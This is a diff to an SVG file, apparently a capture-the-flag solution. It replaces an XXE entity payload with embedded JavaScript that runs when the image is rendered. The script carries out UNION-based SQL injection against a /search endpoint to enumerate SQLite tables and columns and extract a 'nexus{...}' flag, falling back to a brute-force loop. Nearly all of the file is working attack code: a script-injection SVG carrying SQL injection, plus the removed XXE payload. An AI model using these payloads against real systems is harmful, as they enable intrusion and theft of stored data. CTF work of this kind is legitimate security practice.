@@ -1,8 +1,139 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
-    <!ENTITY xxe SYSTEM "http://localhost:8001/search?q=') UNION SELECT name, sql FROM sqlite_master WHERE type='table'; --">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
-    <rect width="1000" height="1000" fill="white"/>
-    <text x="10" y="50" font-size="12" fill="black">&xxe;</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
+  <script type="text/javascript">
+    // Create a status div to track progress
+    const statusDiv = document.createElement('div');
+    statusDiv.style.position = 'fixed';
+    statusDiv.style.top = '10px';
+    statusDiv.style.left = '10px';
+    statusDiv.style.backgroundColor = 'white';
+    statusDiv.style.padding = '10px';
+    statusDiv.style.border = '1px solid black';
+    statusDiv.style.zIndex = '1000';
+    document.body.appendChild(statusDiv);
+    
+    function updateStatus(message) {
+      statusDiv.innerText = message;
+      console.log(message);
+    }
+    
+    updateStatus('Starting SQL injection attack...');
+    
+    (async () => {
+      // First, let's try to enumerate tables from sqlite_master
+      try {
+        updateStatus('Attempting to query sqlite_master...');
+        const sqliteMasterQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
+        const resp = await fetch(`/search?q=${encodeURIComponent(sqliteMasterQuery)}`);
+        const data = await resp.text();
+        updateStatus('sqlite_master response received. Checking results...');
+        
+        // Look for table names that match our pattern (starting with _)
+        const tablePattern = /_[0-9a-f]{16}/g;
+        const foundTables = data.match(tablePattern);
+        
+        if (foundTables && foundTables.length > 0) {
+          updateStatus(`Found potential tables: ${foundTables.join(', ')}`);
+          
+          // For each found table, try to extract the column name and then the flag
+          for (const table of foundTables) {
+            updateStatus(`Trying to get columns for table: ${table}`);
+            
+            // Query to get column information
+            const columnQuery = `' UNION SELECT name, type FROM pragma_table_info('${table}') --`;
+            const colResp = await fetch(`/search?q=${encodeURIComponent(columnQuery)}`);
+            const colData = await colResp.text();
+            
+            // Look for column names that match our pattern (starting with flag_)
+            const columnPattern = /flag_[0-9a-f]{16}/g;
+            const foundColumns = colData.match(columnPattern);
+            
+            if (foundColumns && foundColumns.length > 0) {
+              updateStatus(`Found columns for ${table}: ${foundColumns.join(', ')}`);
+              
+              // Try each column to find the flag
+              for (const column of foundColumns) {
+                updateStatus(`Trying to extract flag from ${table}.${column}`);
+                const flagQuery = `' UNION SELECT id, ${column} FROM ${table} --`;
+                const flagResp = await fetch(`/search?q=${encodeURIComponent(flagQuery)}`);
+                const flagData = await flagResp.text();
+                
+                // Check if we found something that looks like our flag format
+                if (flagData.includes('nexus{')) {
+                  const flagMatch = flagData.match(/nexus\{[^}]*\}/);
+                  if (flagMatch) {
+                    const flag = flagMatch[0];
+                    updateStatus(`🎉 FLAG FOUND: ${flag}`);
+                    document.body.innerHTML = `<h1>FLAG FOUND: ${flag}</h1>`;
+                    
+                    // Show an alert with the flag
+                    alert(`FLAG FOUND: ${flag}`);
+                    
+                    return; // Stop execution once flag is found
+                  }
+                }
+              }
+            }
+          }
+        } else {
+          updateStatus('No matching tables found. Trying brute force approach...');
+          
+          // If we couldn't enumerate the tables, fall back to brute force
+          // First, let's try some common UNION queries for blind discovery
+          const testQueries = [
+            "' UNION SELECT 1,2 --",
+            "' UNION SELECT 1,2,3 --",
+            "' OR 1=1 --",
+            "' ORDER BY 1 --",
+            "' ORDER BY 2 --",
+            "' ORDER BY 3 --"
+          ];
+          
+          for (const query of testQueries) {
+            updateStatus(`Trying test query: ${query}`);
+            const resp = await fetch(`/search?q=${encodeURIComponent(query)}`);
+            const data = await resp.text();
+            // Look for any useful information in responses
+          }
+          
+          // Fall back to partial brute force with promising prefixes
+          const hex = '0123456789abcdef';
+          
+          // Try some shorter patterns first (first few characters)
+          for (let i = 0; i < 1000; i++) {
+            const prefix1 = hex[Math.floor(Math.random() * 16)] + hex[Math.floor(Math.random() * 16)];
+            const prefix2 = hex[Math.floor(Math.random() * 16)] + hex[Math.floor(Math.random() * 16)];
+            
+            updateStatus(`Brute force attempt ${i+1}/1000: Testing prefixes ${prefix1}, ${prefix2}`);
+            
+            // Use LIKE operator for partial matches on table names
+            const query = `' UNION SELECT id, flag_${prefix1}% FROM _${prefix2}% WHERE flag_${prefix1}% LIKE 'nexus{%' --`;
+            
+            try {
+              const resp = await fetch(`/search?q=${encodeURIComponent(query)}`);
+              const data = await resp.text();
+              
+              if (data.includes('nexus{')) {
+                const flagMatch = data.match(/nexus\{[^}]*\}/);
+                if (flagMatch) {
+                  const flag = flagMatch[0];
+                  updateStatus(`🎉 FLAG FOUND: ${flag}`);
+                  document.body.innerHTML = `<h1>FLAG FOUND: ${flag}</h1>`;
+                  
+                  // Show an alert with the flag
+                  alert(`FLAG FOUND: ${flag}`);
+                  
+                  return;
+                }
+              }
+            } catch (e) {}
+          }
+        }
+      } catch (e) {
+        updateStatus(`Error: ${e.message}`);
+      }
+      
+      updateStatus('Finished all attempts. If you see this message, try uploading the SVG again.');
+    })();
+  </script>
 </svg>
